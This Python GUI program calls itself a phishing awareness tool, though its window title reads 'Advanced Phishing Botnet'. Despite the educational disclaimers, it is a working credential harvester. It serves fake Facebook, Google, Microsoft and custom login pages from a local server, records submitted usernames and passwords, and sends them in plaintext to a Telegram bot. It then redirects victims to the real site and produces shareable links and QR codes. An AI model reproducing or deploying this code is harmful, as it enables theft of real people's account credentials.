import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import socket
import threading
import http.server
import socketserver
import os
import json
import requests
import qrcode
import io
from PIL import Image, ImageTk
import base64
import datetime
import webbrowser
import random
import string

class PhishingAwarenessTool:
    def __init__(self, root):
        self.root = root
        self.root.title("Accurate Cyber Defense Advanced Phishing Botnet")
        self.root.geometry("1200x800")
        
        # Theme configuration
        self.themes = {
            "purple": {
                "primary": "#4A235A",      # Dark purple
                "secondary": "#6C3483",    # Medium purple
                "accent1": "#E74C3C",      # Red
                "accent2": "#F39C12",      # Orange
                "accent3": "#F1C40F",      # Yellow
                "text": "#FFFFFF"          # White
            },
            "red": {
                "primary": "#641E16",      # Dark red
                "secondary": "#922B21",    # Medium red
                "accent1": "#E74C3C",      # Bright red
                "accent2": "#F39C12",      # Orange
                "accent3": "#F1C40F",      # Yellow
                "text": "#FFFFFF"          # White
            },
            "yellow": {
                "primary": "#7D6608",      # Dark yellow
                "secondary": "#B7950B",    # Medium yellow
                "accent1": "#E74C3C",      # Red
                "accent2": "#F39C12",      # Orange
                "accent3": "#F7DC6F",      # Light yellow
                "text": "#2C3E50"          # Dark blue
            },
            "orange": {
                "primary": "#784212",      # Dark orange
                "secondary": "#BA4A00",    # Medium orange
                "accent1": "#E74C3C",      # Red
                "accent2": "#F39C12",      # Orange
                "accent3": "#F1C40F",      # Yellow
                "text": "#FFFFFF"          # White
            }
        }
        
        # Configuration variables
        self.config = {
            "telegram_token": "",
            "telegram_chat_id": "",
            "server_port": 8000,
            "phishing_pages": {},
            "credentials": [],
            "current_theme": "purple"
        }
        
        # Set current theme
        self.current_theme = self.themes[self.config["current_theme"]]
        
        # Try to load existing config
        self.load_config()
        
        # Apply theme to root
        self.root.configure(bg=self.current_theme["primary"])
        
        # Server variables
        self.server = None
        self.server_thread = None
        self.is_running = False
        
        # Setup GUI
        self.setup_gui()
        
        # Check if server is already running
        self.update_server_status()
    
    def setup_gui(self):
        # Create main notebook (tabs)
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create frames for each tab
        self.dashboard_frame = ttk.Frame(self.notebook, padding=10)
        self.tools_frame = ttk.Frame(self.notebook, padding=10)
        self.settings_frame = ttk.Frame(self.notebook, padding=10)
        self.help_frame = ttk.Frame(self.notebook, padding=10)
        
        # Add tabs to notebook
        self.notebook.add(self.dashboard_frame, text="Dashboard")
        self.notebook.add(self.tools_frame, text="Tools")
        self.notebook.add(self.settings_frame, text="Settings")
        self.notebook.add(self.help_frame, text="Help")
        
        # Setup each tab
        self.setup_dashboard()
        self.setup_tools()
        self.setup_settings()
        self.setup_help()
        
        # Apply theme
        self.apply_theme()
    
    def apply_theme(self):
        style = ttk.Style()
        style.theme_use('clam')
        
        # Configure colors for all themes
        style.configure("TNotebook", background=self.current_theme["primary"])
        style.configure("TNotebook.Tab", 
                       background=self.current_theme["secondary"],
                       foreground=self.current_theme["text"],
                       padding=[10, 5])
        style.map("TNotebook.Tab", 
                 background=[("selected", self.current_theme["accent1"])],
                 foreground=[("selected", self.current_theme["text"])])
        
        style.configure("TFrame", background=self.current_theme["primary"])
        style.configure("TLabel", background=self.current_theme["primary"], 
                       foreground=self.current_theme["text"])
        style.configure("TButton", background=self.current_theme["accent2"],
                       foreground="#000000")
        style.configure("TLabelframe", background=self.current_theme["primary"],
                       foreground=self.current_theme["text"])
        style.configure("TLabelframe.Label", background=self.current_theme["primary"],
                       foreground=self.current_theme["accent3"])
        style.configure("Header.TLabel", background=self.current_theme["primary"],
                       foreground=self.current_theme["accent3"], font=("Arial", 16, "bold"))
        
        # Configure custom button styles
        style.configure("Accent1.TButton", background=self.current_theme["accent1"],
                       foreground=self.current_theme["text"])
        style.configure("Accent2.TButton", background=self.current_theme["accent2"],
                       foreground="#000000")
        style.configure("Accent3.TButton", background=self.current_theme["accent3"],
                       foreground="#000000")
        
        # Configure entry and combobox
        style.configure("TEntry", fieldbackground="#FFFFFF")
        style.configure("TCombobox", fieldbackground="#FFFFFF")
    
    def change_theme(self, theme_name):
        if theme_name in self.themes:
            self.config["current_theme"] = theme_name
            self.current_theme = self.themes[theme_name]
            self.root.configure(bg=self.current_theme["primary"])
            self.apply_theme()
            self.save_config()
            messagebox.showinfo("Theme Changed", f"Theme changed to {theme_name.capitalize()}")
    
    def setup_dashboard(self):
        # Header
        header = ttk.Label(self.dashboard_frame, text="Phishing Awareness Dashboard", 
                          style="Header.TLabel")
        header.pack(pady=10)
        
        # Theme selector
        theme_frame = ttk.Frame(self.dashboard_frame)
        theme_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(theme_frame, text="Theme:").pack(side=tk.LEFT, padx=5)
        
        theme_var = tk.StringVar(value=self.config["current_theme"])
        theme_combo = ttk.Combobox(theme_frame, textvariable=theme_var, 
                                  values=list(self.themes.keys()), state="readonly", width=10)
        theme_combo.pack(side=tk.LEFT, padx=5)
        theme_combo.bind('<<ComboboxSelected>>', lambda e: self.change_theme(theme_var.get()))
        
        # Server status frame
        status_frame = ttk.Frame(self.dashboard_frame)
        status_frame.pack(fill=tk.X, pady=10)
        
        ttk.Label(status_frame, text="Server Status:").pack(side=tk.LEFT, padx=5)
        self.server_status_label = ttk.Label(status_frame, text="Stopped", foreground="red")
        self.server_status_label.pack(side=tk.LEFT, padx=5)
        
        self.toggle_server_btn = ttk.Button(status_frame, text="Start Server", 
                                           command=self.toggle_server, style="Accent1.TButton")
        self.toggle_server_btn.pack(side=tk.RIGHT, padx=5)
        
        # Stats frame
        stats_frame = ttk.LabelFrame(self.dashboard_frame, text="Statistics")
        stats_frame.pack(fill=tk.X, pady=10)
        
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Label(stats_grid, text="Phishing Pages Created:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        self.pages_count_label = ttk.Label(stats_grid, text="0", foreground=self.current_theme["accent3"])
        self.pages_count_label.grid(row=0, column=1, sticky=tk.W, padx=5, pady=5)
        
        ttk.Label(stats_grid, text="Credentials Captured:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        self.creds_count_label = ttk.Label(stats_grid, text="0", foreground=self.current_theme["accent3"])
        self.creds_count_label.grid(row=1, column=1, sticky=tk.W, padx=5, pady=5)
        
        ttk.Label(stats_grid, text="Telegram Notifications:").grid(row=0, column=2, sticky=tk.W, padx=5, pady=5)
        self.telegram_count_label = ttk.Label(stats_grid, text="0", foreground=self.current_theme["accent3"])
        self.telegram_count_label.grid(row=0, column=3, sticky=tk.W, padx=5, pady=5)
        
        ttk.Label(stats_grid, text="Current Theme:").grid(row=1, column=2, sticky=tk.W, padx=5, pady=5)
        self.theme_label = ttk.Label(stats_grid, text=self.config["current_theme"].capitalize(), 
                                    foreground=self.current_theme["accent3"])
        self.theme_label.grid(row=1, column=3, sticky=tk.W, padx=5, pady=5)
        
        # Recent activity frame
        activity_frame = ttk.LabelFrame(self.dashboard_frame, text="Recent Activity")
        activity_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.activity_text = scrolledtext.ScrolledText(activity_frame, height=10, bg="#2C3E50", fg="#ECF0F1")
        self.activity_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.activity_text.config(state=tk.DISABLED)
        
        # Update stats
        self.update_stats()
    
    def setup_tools(self):
        # Header
        header = ttk.Label(self.tools_frame, text="Accurate Cyber Defense Phishing Awareness Tools", 
                          style="Header.TLabel")
        header.pack(pady=10)
        
        # Link generation frame
        link_frame = ttk.LabelFrame(self.tools_frame, text="Phishing Link Generator")
        link_frame.pack(fill=tk.X, pady=10)
        
        # Template selection
        template_frame = ttk.Frame(link_frame)
        template_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(template_frame, text="Select Template:").pack(side=tk.LEFT)
        self.template_var = tk.StringVar(value="facebook")
        templates = ttk.Combobox(template_frame, textvariable=self.template_var, 
                                values=["facebook", "google", "twitter", "linkedin", "microsoft", "custom"])
        templates.pack(side=tk.LEFT, padx=10)
        
        # Custom template upload
        self.custom_template_frame = ttk.Frame(link_frame)
        
        ttk.Button(self.custom_template_frame, text="Upload Custom Login Page", 
                  command=self.upload_custom_template, style="Accent3.TButton").pack(pady=5)
        
        # URL input
        url_frame = ttk.Frame(link_frame)
        url_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(url_frame, text="Target URL:").pack(side=tk.LEFT)
        self.target_url = tk.StringVar(value="https://example.com")
        url_entry = ttk.Entry(url_frame, textvariable=self.target_url, width=50)
        url_entry.pack(side=tk.LEFT, padx=10)
        
        # Generate button
        ttk.Button(link_frame, text="Generate Phishing Link", 
                  command=self.generate_phishing_link, style="Accent1.TButton").pack(pady=10)
        
        # Result frame
        result_frame = ttk.Frame(link_frame)
        result_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(result_frame, text="Generated Link:").pack(side=tk.LEFT)
        self.generated_link = tk.StringVar()
        link_entry = ttk.Entry(result_frame, textvariable=self.generated_link, width=50, state="readonly")
        link_entry.pack(side=tk.LEFT, padx=10)
        
        ttk.Button(result_frame, text="Copy", command=self.copy_link, style="Accent2.TButton").pack(side=tk.LEFT, padx=5)
        ttk.Button(result_frame, text="Open", command=self.open_link, style="Accent3.TButton").pack(side=tk.LEFT, padx=5)
        
        # QR Code frame
        qr_frame = ttk.Frame(link_frame)
        qr_frame.pack(pady=10)
        
        self.qr_label = ttk.Label(qr_frame)
        self.qr_label.pack()
        
        # Show/hide custom template frame based on selection
        self.template_var.trace('w', self.template_changed)
        self.template_changed()
    
    def template_changed(self, *args):
        if self.template_var.get() == "custom":
            self.custom_template_frame.pack(fill=tk.X, padx=10, pady=5)
        else:
            self.custom_template_frame.pack_forget()
    
    def setup_settings(self):
        # Header
        header = ttk.Label(self.settings_frame, text="Settings", style="Header.TLabel")
        header.pack(pady=10)
        
        # Telegram configuration frame
        telegram_frame = ttk.LabelFrame(self.settings_frame, text="Telegram Configuration")
        telegram_frame.pack(fill=tk.X, pady=10)
        
        # Token
        token_frame = ttk.Frame(telegram_frame)
        token_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(token_frame, text="Bot Token:").pack(side=tk.LEFT)
        self.telegram_token_var = tk.StringVar(value=self.config["telegram_token"])
        token_entry = ttk.Entry(token_frame, textvariable=self.telegram_token_var, width=50)
        token_entry.pack(side=tk.LEFT, padx=10)
        
        # Chat ID
        chatid_frame = ttk.Frame(telegram_frame)
        chatid_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(chatid_frame, text="Chat ID:").pack(side=tk.LEFT)
        self.telegram_chatid_var = tk.StringVar(value=self.config["telegram_chat_id"])
        chatid_entry = ttk.Entry(chatid_frame, textvariable=self.telegram_chatid_var, width=50)
        chatid_entry.pack(side=tk.LEFT, padx=10)
        
        # Buttons
        btn_frame = ttk.Frame(telegram_frame)
        btn_frame.pack(pady=10)
        
        ttk.Button(btn_frame, text="Save Telegram Config", 
                  command=self.save_telegram_config, style="Accent1.TButton").pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Test Telegram Connection", 
                  command=self.test_telegram, style="Accent2.TButton").pack(side=tk.LEFT, padx=5)
        
        # Server configuration frame
        server_frame = ttk.LabelFrame(self.settings_frame, text="Server Configuration")
        server_frame.pack(fill=tk.X, pady=10)
        
        port_frame = ttk.Frame(server_frame)
        port_frame.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(port_frame, text="Server Port:").pack(side=tk.LEFT)
        self.server_port_var = tk.IntVar(value=self.config["server_port"])
        port_spinbox = ttk.Spinbox(port_frame, from_=1024, to=65535, 
                                  textvariable=self.server_port_var, width=10)
        port_spinbox.pack(side=tk.LEFT, padx=10)
        
        ttk.Button(port_frame, text="Save Port", command=self.save_server_port, style="Accent3.TButton").pack(side=tk.LEFT, padx=10)
        
        # Data management frame
        data_frame = ttk.LabelFrame(self.settings_frame, text="Data Management")
        data_frame.pack(fill=tk.X, pady=10)
        
        ttk.Button(data_frame, text="View Captured Credentials", 
                  command=self.view_credentials, style="Accent1.TButton").pack(pady=5)
        ttk.Button(data_frame, text="Export Data", 
                  command=self.export_data, style="Accent2.TButton").pack(pady=5)
        ttk.Button(data_frame, text="Clear All Data", 
                  command=self.clear_data, style="Accent3.TButton").pack(pady=5)
    
    def setup_help(self):
        # Header
        header = ttk.Label(self.help_frame, text="Help & Information", style="Header.TLabel")
        header.pack(pady=10)
        
        # Info text
        help_text = """
        Phishing Awareness Educational Tool
        
        This tool is designed for educational purposes only to help understand:
        - How phishing attacks work
        - How to recognize phishing attempts
        - The importance of cybersecurity awareness
        
        Features:
        1. Generate simulated phishing pages for educational purposes
        2. Monitor and analyze attempted accesses
        3. Send educational alerts via Telegram
        
        Important: 
        - This tool should only be used on systems you own or have permission to test
        - Never use this tool for malicious purposes
        - Always obtain proper authorization before testing
        
        Commands:
        - Help: Shows this information
        - Config Telegram Token: Set your Telegram bot token
        - Config Telegram Chat ID: Set your Telegram chat ID
        - Test Telegram Connection: Test if Telegram notifications work
        - Generate Link: Create a simulated phishing link for education
        """
        
        help_text_widget = scrolledtext.ScrolledText(self.help_frame, wrap=tk.WORD, height=20, bg="#2C3E50", fg="#ECF0F1")
        help_text_widget.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        help_text_widget.insert(tk.END, help_text)
        help_text_widget.config(state=tk.DISABLED)
        
        # Disclaimer
        disclaimer = ttk.Label(self.help_frame, 
                              text="Disclaimer: This tool is for educational purposes only. Use responsibly and ethically.",
                              foreground=self.current_theme["accent1"], wraplength=600)
        disclaimer.pack(pady=10)
    
    def load_config(self):
        try:
            if os.path.exists("config.json"):
                with open("config.json", "r") as f:
                    loaded_config = json.load(f)
                    self.config.update(loaded_config)
                    
                    # Update current theme if it exists in loaded config
                    if "current_theme" in loaded_config and loaded_config["current_theme"] in self.themes:
                        self.current_theme = self.themes[loaded_config["current_theme"]]
        except Exception as e:
            print(f"Error loading config: {e}")
    
    def save_config(self):
        try:
            with open("config.json", "w") as f:
                json.dump(self.config, f, indent=4)
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save config: {str(e)}")
    
    def update_stats(self):
        self.pages_count_label.config(text=str(len(self.config["phishing_pages"])))
        self.creds_count_label.config(text=str(len(self.config["credentials"])))
        self.theme_label.config(text=self.config["current_theme"].capitalize())
        
        # Count Telegram notifications sent
        telegram_count = sum(1 for cred in self.config["credentials"] if cred.get("telegram_sent", False))
        self.telegram_count_label.config(text=str(telegram_count))
    
    def update_server_status(self):
        if self.is_running:
            self.server_status_label.config(text="Running", foreground="green")
            self.toggle_server_btn.config(text="Stop Server")
        else:
            self.server_status_label.config(text="Stopped", foreground="red")
            self.toggle_server_btn.config(text="Start Server")
    
    def toggle_server(self):
        if self.is_running:
            self.stop_server()
        else:
            self.start_server()
    
    def start_server(self):
        try:
            # Create server directory if it doesn't exist
            if not os.path.exists("server"):
                os.makedirs("server")
            
            # Create a simple index page for educational purposes
            with open("server/index.html", "w") as f:
                f.write("""
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Educational Phishing Awareness Server</title>
                    <style>
                        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f4f4f4; }
                        h1 { color: #4A235A; }
                        p { line-height: 1.6; }
                        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <h1>Educational Phishing Awareness Server</h1>
                        <p>This server is part of an educational tool to demonstrate how phishing attacks work.</p>
                        <p>Remember: Always verify URLs before entering sensitive information.</p>
                    </div>
                </body>
                </html>
                """)
            
            # Start the server in a separate thread
            self.server = socketserver.TCPServer(("", self.config["server_port"]), 
                                                PhishingHTTPRequestHandler)
            self.server.tool_reference = self  # Pass reference to this tool
            
            self.server_thread = threading.Thread(target=self.server.serve_forever)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            self.is_running = True
            self.update_server_status()
            self.log_activity("Server started on port " + str(self.config["server_port"]))
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start server: {str(e)}")
    
    def stop_server(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.is_running = False
            self.update_server_status()
            self.log_activity("Server stopped")
    
    def generate_phishing_link(self):
        template = self.template_var.get()
        target_url = self.target_url.get()
        
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'https://' + target_url
        
        # Generate a random path for the phishing page
        random_path = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        phishing_url = f"http://localhost:{self.config['server_port']}/{random_path}"
        
        # Store the phishing page info
        self.config["phishing_pages"][random_path] = {
            "template": template,
            "target_url": target_url,
            "created_at": datetime.datetime.now().isoformat(),
            "custom_template": None
        }
        
        # If custom template was uploaded, store it
        if template == "custom" and hasattr(self, 'custom_template_content'):
            self.config["phishing_pages"][random_path]["custom_template"] = self.custom_template_content
        
        self.generated_link.set(phishing_url)
        
        # Generate QR code
        self.generate_qr_code(phishing_url)
        
        # Update stats
        self.update_stats()
        self.save_config()
        
        self.log_activity(f"Generated phishing link for {template} template: {phishing_url}")
    
    def generate_qr_code(self, url):
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(url)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        
        # Convert to Tkinter-compatible image
        tk_image = ImageTk.PhotoImage(img)
        
        self.qr_label.configure(image=tk_image)
        self.qr_label.image = tk_image  # Keep a reference
    
    def copy_link(self):
        self.root.clipboard_clear()
        self.root.clipboard_append(self.generated_link.get())
        messagebox.showinfo("Copied", "Link copied to clipboard")
    
    def open_link(self):
        webbrowser.open(self.generated_link.get())
    
    def upload_custom_template(self):
        file_path = filedialog.askopenfilename(
            title="Select HTML Login Page",
            filetypes=[("HTML files", "*.html"), ("All files", "*.*")]
        )
        
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    self.custom_template_content = f.read()
                messagebox.showinfo("Success", "Custom template uploaded successfully")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to read file: {str(e)}")
    
    def save_telegram_config(self):
        self.config["telegram_token"] = self.telegram_token_var.get()
        self.config["telegram_chat_id"] = self.telegram_chatid_var.get()
        self.save_config()
        messagebox.showinfo("Success", "Telegram configuration saved")
    
    def test_telegram(self):
        if not self.config["telegram_token"] or not self.config["telegram_chat_id"]:
            messagebox.showerror("Error", "Please configure Telegram token and chat ID first")
            return
        
        try:
            message = "This is a test message from the Phishing Awareness Educational Tool"
            self.send_telegram_message(message)
            messagebox.showinfo("Success", "Test message sent to Telegram")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to send Telegram message: {str(e)}")
    
    def send_telegram_message(self, message):
        if not self.config["telegram_token"] or not self.config["telegram_chat_id"]:
            return False
        
        url = f"https://api.telegram.org/bot{self.config['telegram_token']}/sendMessage"
        payload = {
            "chat_id": self.config["telegram_chat_id"],
            "text": message
        }
        
        response = requests.post(url, json=payload)
        return response.status_code == 200
    
    def save_server_port(self):
        self.config["server_port"] = self.server_port_var.get()
        self.save_config()
        messagebox.showinfo("Success", "Server port saved")
    
    def view_credentials(self):
        # Create a new window to display captured credentials
        creds_window = tk.Toplevel(self.root)
        creds_window.title("Captured Credentials")
        creds_window.geometry("800x400")
        creds_window.configure(bg=self.current_theme["primary"])
        
        # Create a text widget to display credentials
        text_widget = scrolledtext.ScrolledText(creds_window, wrap=tk.WORD, bg="#2C3E50", fg="#ECF0F1")
        text_widget.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Add credentials to the text widget
        if not self.config["credentials"]:
            text_widget.insert(tk.END, "No credentials captured yet.")
        else:
            for i, cred in enumerate(self.config["credentials"]):
                text_widget.insert(tk.END, f"Entry {i+1}:\n")
                text_widget.insert(tk.END, f"Username: {cred.get('username', 'N/A')}\n")
                text_widget.insert(tk.END, f"Password: {cred.get('password', 'N/A')}\n")
                text_widget.insert(tk.END, f"Timestamp: {cred.get('timestamp', 'N/A')}\n")
                text_widget.insert(tk.END, f"Page: {cred.get('page', 'N/A')}\n")
                text_widget.insert(tk.END, "-" * 40 + "\n")
        
        text_widget.config(state=tk.DISABLED)
    
    def export_data(self):
        file_path = filedialog.asksaveasfilename(
            title="Export Data",
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
        )
        
        if file_path:
            try:
                with open(file_path, 'w') as f:
                    json.dump(self.config, f, indent=4)
                messagebox.showinfo("Success", "Data exported successfully")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export data: {str(e)}")
    
    def clear_data(self):
        if messagebox.askyesno("Confirm", "Are you sure you want to clear all data? This cannot be undone."):
            self.config["phishing_pages"] = {}
            self.config["credentials"] = []
            self.save_config()
            self.update_stats()
            self.log_activity("All data cleared")
            messagebox.showinfo("Success", "All data has been cleared")
    
    def log_activity(self, message):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] {message}\n"
        
        self.activity_text.config(state=tk.NORMAL)
        self.activity_text.insert(tk.END, log_message)
        self.activity_text.see(tk.END)
        self.activity_text.config(state=tk.DISABLED)
    
    def capture_credentials(self, username, password, page):
        timestamp = datetime.datetime.now().isoformat()
        
        credential = {
            "username": username,
            "password": password,
            "page": page,
            "timestamp": timestamp
        }
        
        # Try to send via Telegram
        if self.config["telegram_token"] and self.config["telegram_chat_id"]:
            message = f"Educational alert: Credentials captured\nPage: {page}\nUsername: {username}\nPassword: {password}\nTimestamp: {timestamp}"
            if self.send_telegram_message(message):
                credential["telegram_sent"] = True
        
        self.config["credentials"].append(credential)
        self.update_stats()
        self.save_config()
        
        self.log_activity(f"Captured credentials from {page} - Username: {username}")


# HTTP Request Handler for the phishing server
class PhishingHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Check if this is a known phishing page
        path = self.path.lstrip('/').split('?')[0]  # Remove leading slash and query params
        
        if path in self.server.tool_reference.config["phishing_pages"]:
            self.serve_phishing_page(path)
        else:
            # Serve regular files from the server directory
            self.directory = "server"
            super().do_GET()
    
    def serve_phishing_page(self, path):
        page_info = self.server.tool_reference.config["phishing_pages"][path]
        template = page_info["template"]
        
        if template == "custom" and page_info.get("custom_template"):
            html_content = page_info["custom_template"]
        else:
            # Generate a simple educational login form
            html_content = self.generate_login_form(template, page_info["target_url"])
        
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(html_content.encode())
    
    def do_POST(self):
        path = self.path.lstrip('/').split('?')[0]
        
        if path in self.server.tool_reference.config["phishing_pages"]:
            # Parse form data
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            
            # Simple form data parsing
            form_data = {}
            for pair in post_data.split('&'):
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    form_data[key] = value
            
            # Capture credentials for educational purposes
            username = form_data.get('username', form_data.get('email', ''))
            password = form_data.get('password', '')
            
            # URL decode
            import urllib.parse
            username = urllib.parse.unquote(username)
            password = urllib.parse.unquote(password)
            
            # Store credentials
            self.server.tool_reference.capture_credentials(username, password, path)
            
            # Redirect to the real site with educational message
            target_url = self.server.tool_reference.config["phishing_pages"][path]["target_url"]
            
            self.send_response(302)
            self.send_header('Location', target_url)
            self.end_headers()
        else:
            self.send_error(404)
    
    def generate_login_form(self, template, target_url):
        # This is a simplified educational form
        title = template.capitalize() if template != "custom" else "Login"
        
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>{title} Login - Educational Page</title>
            <style>
                body {{
                    font-family: Arial, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }}
                .login-container {{
                    background-color: white;
                    padding: 30px;
                    border-radius: 8px;
                    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
                    width: 320px;
                }}
                h2 {{
                    color: #4A235A;
                    text-align: center;
                    margin-bottom: 20px;
                }}
                .form-group {{
                    margin-bottom: 15px;
                }}
                label {{
                    display: block;
                    margin-bottom: 5px;
                    color: #555;
                    font-weight: bold;
                }}
                input[type="text"],
                input[type="password"] {{
                    width: 100%;
                    padding: 12px;
                    border: 1px solid #ddd;
                    border-radius: 4px;
                    box-sizing: border-box;
                    font-size: 14px;
                }}
                button {{
                    width: 100%;
                    padding: 12px;
                    background-color: #E74C3C;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 16px;
                    font-weight: bold;
                    transition: background-color 0.3s;
                }}
                button:hover {{
                    background-color: #C0392B;
                }}
                .educational-note {{
                    margin-top: 20px;
                    padding: 12px;
                    background-color: #F1C40F;
                    border-radius: 4px;
                    font-size: 12px;
                    color: #2C3E50;
                }}
            </style>
        </head>
        <body>
            <div class="login-container">
                <h2>{title} Login</h2>
                <form method="POST">
                    <div class="form-group">
                        <label for="username">Username or Email</label>
                        <input type="text" id="username" name="username" required>
                    </div>
                    <div class="form-group">
                        <label for="password">Password</label>
                        <input type="password" id="password" name="password" required>
                    </div>
                    <button type="submit">Login</button>
                </form>
                <div class="educational-note">
                    <strong>Educational Note:</strong> This is a simulated login page created by Accurate Cyber Defense for cybersecurity education and training purposes only.
                    In a real phishing attack, your credentials would be stolen. Always check the URL before entering sensitive information.
                </div>
            </div>
        </body>
        </html>
        """


def main():
    root = tk.Tk()
    app = PhishingAwarenessTool(root)
    root.mainloop()

if __name__ == "__main__":
    main()